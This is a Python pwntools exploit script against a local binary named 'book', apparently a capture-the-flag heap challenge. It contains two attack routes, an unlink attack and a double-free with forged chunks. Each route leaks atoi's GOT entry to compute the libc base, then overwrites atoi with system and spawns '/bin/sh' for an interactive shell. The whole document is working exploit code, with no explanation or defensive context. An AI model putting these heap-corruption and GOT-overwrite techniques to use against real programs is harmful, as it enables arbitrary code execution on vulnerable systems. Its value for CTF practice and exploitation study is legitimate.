from pwn import *

def add_book(author, feed_len, feed):
	io.recvuntil('choice!!\n')
	io.sendline('2')
	io.recvuntil('author:\n')
	io.sendline(author)
	io.recvuntil('it?\n')
	io.sendline(str(feed_len))
	io.sendline(feed)

def edit_feed(id, feed):
	io.recvuntil('choice!!\n')
	io.sendline('4')
	io.recvuntil('feedback?\n')
	io.sendline(str(id))
	io.sendline(feed)


def free_book(id):
	io.recvuntil('choice!!\n')
	io.sendline('3')
	io.recvuntil('book?')
	io.sendline(str(id))

#context.log_level= 'debug'

io = process('./book')
e = ELF('./book')
libc = e.libc





def leak_and_shell():
	ptr = 0x0601D60

	payload = p64(1) + p64(0x80)
	payload += 'A'*8 + p64(ptr)
	payload += p64(2) + p64(2)
	payload += p64(0x80) + 'A'*8
	payload += p64(e.got['atoi'])
	edit_feed(0, payload)


	io.recvuntil('choice!!\n')
	io.sendline('4')
	io.recvuntil('book1 is ')

	buf = io.recvuntil('\n')[:-1]
	assert len(buf)>=6
	buf = buf.ljust(8,'\x00')
	atoi_addr = u64(buf)
	log.success('atoi:%#x'% atoi_addr)

	libc_base = atoi_addr - libc.symbols['atoi']
	system_addr = libc_base + libc.symbols['system']

	log.success('system:%#x'% system_addr)
	io.sendline('1')
	io.sendline(p64(system_addr))

	#gdb.attach(io, 'x/20qx 0x0601D40')
	io.recvuntil('choice!!\n')
	io.sendline('/bin/sh')
	io.interactive()

def unlink():
	add_book('A'*4, 0x80, 'B'*0x70)
	add_book('C'*4, 0x80, 'D'*0x70)

	ptr = 0x0601D60

	payload = p64(0) + p64(0x81)
	payload += p64(ptr - 0x18) + p64(ptr - 0x10)
	payload += 'A'* 0x60
	payload += p64(0x80) + p64(0x90)

	edit_feed(0, payload)
	free_book(1)

	leak_and_shell()

def double_free():
	add_book('A'*4, 0x80, 'B'*0x70)
	add_book('A'*4, 0x80, 'B'*0x70)



	free_book(0)
	free_book(1)

	ptr = 0x0601D60
	chuck1 = p64(0) + p64(0x81)	
	chuck1 += p64(ptr - 0x18) + p64(ptr - 0x10)
	chuck1 = chuck1.ljust((0x80), 'A')

	chuck2 = p64(0x80) + p64(0x120)
	chuck2 = chuck2.ljust(0x120, 'A')

	payload = chuck1 + chuck2
	assert len(payload) == 0x80 + 0x90*2
	add_book('A'*4, 0x80 + 0x90*2, payload)

	free_book(1)
	#gdb.attach(io, 'b*0x00004013BB\nx/20qx 0x0601D40')
	leak_and_shell()

	io.interactive()

#unlink()
double_free()